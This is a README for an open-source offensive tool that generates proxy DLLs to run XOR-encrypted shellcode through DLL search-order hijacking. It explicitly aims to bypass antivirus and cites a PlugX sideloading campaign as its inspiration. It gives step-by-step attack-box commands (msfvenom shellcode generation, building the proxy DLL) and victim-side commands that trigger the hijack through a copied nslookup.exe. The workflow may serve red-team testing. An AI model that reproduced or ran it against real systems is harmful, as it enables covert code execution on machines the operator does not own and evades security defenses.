# Chinese Diad - Proxy DLL for injecting XOR encrypted shellcode

## TLDR

Bypass antivirus by separating your shellcode from your loader, and executing it through a DLL hijack.

There are many other DLL proxying tools out there, but I had to modify each of them a bit to get what I wanted so I decided to just consolidate them into my own.

## Introduction

This tool was largely inspired by the [PlugX triad](https://www.sentinelone.com/labs/moshen-dragons-triad-and-error-approach-abusing-security-software-to-sideload-plugx-and-shadowpad/) where Chinese APTs used DLL search order hijacking to decrypt a local payload.

DLL hijacking is an older technique and likely won't go away until DLL signing is enforced.

## Dependencies

```
sudo apt install -y mingw-w64-x86-64-dev g++-mingw-w64-x86-64
```

## Usage

1. Identify the DLL that you want to proxy and pull it down.
1. Generate the shellcode that you want to execute.
1. Use chinese_diad to create your proxy dll and encrypted shellcode blob.
1. Push your proxy dll and shellcode blob to your target and trigger the hijack.
1. Profit.

```
usage: chinese_diad.py [-h] -i INPUT -o OUTPUT -x ORIGINAL [-k XOR_KEY]
                       -p SHELLCODE_FILE [-n] [-d]

Build a proxy DLL that executes XOR encrypted shellcode.

options:
  -h, --help            show this help message and exit
  -i, --input INPUT     Input DLL file
  -o, --output OUTPUT   Output directory
  -x, --original ORIGINAL
                        Path to original DLL on target
  -k, --xor-key XOR_KEY
                        XOR key used to encrypt the shellcode
  -p, --shellcode-file SHELLCODE_FILE
                        Path to the unencrypted shellcode. This will also be
                        the name of the encrypted shellcode that will be
                        loaded by the dll.
  -n, --no-clean        Delete the source files after compiling
  -d, --debug           Compile in debug mode. This implies no clean up.


python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\Windows\System32\dnsapi.dll' -k 'PLUGX' -p /tmp/shellcode.bin
```

## Example

```
[[ ATTACK_BOX ]]
mkdir -p /tmp/chiese_diad
msfvenom -p windows/x64/messagebox -f raw -o /tmp/shellcode.bin
python3 chinese_diad.py -i dnsapi.dll -o /tmp/chinese_diad -x 'C:\Windows\System32\dnsapi.dll' -k 'PLUGX' -p /tmp/shellcode.bin

	#copy the fake dnsapi.dll and encrypted shellcode.bin to target
```

```
[[ VICTIM ]]

#From wherever dnsapi.dll and shellcode.bin are located
copy \Windows\system32\nslookup.exe .
.\nslookup.exe
	#You should expect to be greeted by MSF, but your nslookup will also run.
```

## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<p align="right">(<a href="#readme-top">back to top</a>)</p>

### Top contributors:

<a href="https://github.com/CleverNamesTaken/chinese_diad/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=CleverNamesTaken/chinese_diad" alt="contrib.rocks image" />
</a>



## License

Distributed under the Apache License. See `LICENSE.txt` for more information.

<p align="right">(<a href="#readme-top">back to top</a>)</p>


## References

- github.com/Print3M/DllShimmer
- github.com/Pascal-0x90/sideloadr
- github.com/tothi/dll-hijack-by-proxying
- https://hijacklibs.net/
